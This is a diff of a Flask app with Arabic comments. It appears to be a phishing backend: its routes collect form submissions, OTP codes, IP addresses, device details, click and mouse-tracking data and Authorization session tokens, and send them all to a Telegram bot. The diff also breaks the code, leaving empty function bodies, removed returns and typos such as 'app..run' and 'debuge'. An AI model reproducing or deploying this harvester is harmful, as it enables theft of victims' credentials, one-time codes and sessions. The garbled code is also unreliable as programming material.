@@ -35,12 +35,11 @@ def init_data():
     }
     
 @app.route('/')
-def index():
-    return render_template('index.html')
-@app.route('/login')
-def login():
-    return render_template('login.html')
+def index():     
 
+@app.route('/login/login/<username>')
+def login(username):
+    
 @app.route('/collect', methods=['POST'])
 def collect():
     try:
@@ -52,12 +51,9 @@ def collect():
         data = payload or {}
         
         send_to_telegram(data)
-        
-        return jsonfy(ok=True), 200
            
     except Exception as e:
-        print("collect error:", e)
-        return jsonify(ok=false, error=str(e)), 500        
+        print("collect error:", e)        
 
 def send_to_telegram(data):
     try:
@@ -66,14 +62,10 @@ def send_to_telegram(data):
        return jsonify(ok=True), 200
     except Exception as e:   
        print("collect error:", e)
-       return jsonify(ok=false, error=str(e)), 500
             
 def collect_sessions():
     try:
-        session_data = request.headers.get("Authorization")
-        
-        if not session_data:
-            return
+         session_data = request.headers.get("Authorization")
 
         entry = {"token": session_data}
 
@@ -128,10 +120,8 @@ OTP: {otp}
 IP: {ip}
 '''.
 
-🌍 **بيانات الجهاز والمتصفح**:
         Device/Browser: {data['device_browser']}
         IP: {data['ip']}
-
         Clicks: {data['clicks']}
         Time Spent: {data['time_spent']} ثانية
         Movements: {data['movements']}
@@ -146,30 +136,20 @@ def notify(text: str) -> bool:
         chat_id = os.getenv("TG_CHAT_ID")
         if not BOT_TOKEN or not CHAT_ID:
            print("Env missing TG_BOT_TOKEN or TG_CHAT_ID")
-           return False
         r = requests.post(
             f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
             json={"chat_id": CHAT_ID, "text": text},
             timeout=10
         )
         print("TG >", r.status_code, r.text)
-        return r.ok
     except Exception as e:
         print("notify error:", e)
-        return False            
-
-@app.get("/ping")
-def ping():
-        return "pong", 200 
 
 @app.get("/form")
 def form_page():
-# يخدم ملف الـ HTML من نفس المجلد
-        return send_from_directory(".", "form.html")
 
 @app.get("/")
 def root():
-        return redirect("/form")
         
 @app.route("/track-click", methods=["POST"])
 def track_click():
@@ -185,7 +165,7 @@ def track_click():
         json={"chat_id": CHAT_ID, "text": text},
         timeout=10
         )
-        return ("ok", 200 if r.ok else 500)
+        
 @app.route("/submit", methods=["POST"])
 def submit():
         ua =request.headers.get("User-Agent", "-")
@@ -235,11 +215,9 @@ def submit():
             CHAT_ID = os.getenv("TG_CHAT_ID")
         except Exception as e:
             print("log write error:", e)
-            return jsonify(ok=True), 200
      
 @app.route('/thanks')
-def thanks():
-    return render_template('thanks.html') 
+def thanks(): 
 
 @app.route("/test-notify")
 def test_notify():
@@ -249,8 +227,6 @@ def test_notify():
         payload = {"chat_id": CHAT_ID, "text": "✅ السيرفر شغال وموصل بالبوت"}
         r = requests.post(url, data=payload)
         print("TG >", r.status_code, r.text)
-        return ("sent" if r.ok else "failed"), (200 if r.ok else 500)
-
-        return redirect("/thanks.html")
 if __name__ == "__main__":
-        app.run(host="0.0.0.0", port=8081, debug=True)
+        port = int(os.environ.get("PORT",8081))
+        app..run(host="0.0.0.0", port=port, debuge=True)
